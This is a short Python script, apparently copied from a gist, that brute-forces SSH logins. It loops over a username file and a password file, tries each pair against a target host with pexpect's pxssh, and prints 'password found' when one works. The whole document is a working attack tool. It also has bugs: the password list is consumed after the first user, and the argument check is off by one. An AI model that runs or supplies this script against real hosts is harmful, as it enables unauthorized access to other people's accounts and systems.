#! /usr/bin/python3
#
# SOURCE SCRIPT:  https://gist.github.com/thewindcolince/d21a45b153f9f5662630fc94afba3bb0

from pexpect import pxssh
#import termcolor
import sys


def connect(host, user, password):
    try:
        ssh=pxssh.pxssh()
        ssh.force_password = True
        ssh.login(host, user, password)
        print(f"password found  {user}:{password}")
    except pxssh.ExceptionPxssh as e:
        print(e)
    except KeyboardInterrupt as k:
        print("\n")
        print("terminate")
        print("raison:program stop by user",)
        sys.exit(0)


def main():
    if len(sys.argv) < 3:
        print("Usage: python %prog -host -userfile -passfile")
        print(" ")
        print("Example: python {0} 192.168.10.2 users.txt password.txt".format(sys.argv[0]))
        sys.exit(0)
    else:
        host = sys.argv[1]
        userfile = open(sys.argv[2], 'r')
        passfile = open(sys.argv[3], 'r')

        for u in userfile.readlines():
            for d in passfile.readlines():
                user = u.strip("\n")
                password = d.strip("\n")
                print(str(user) + ":" + str(password))
                connect(host, str(user), str(password) )
        userfile.close()
        passfile.close()

if __name__ == "__main__":
   main()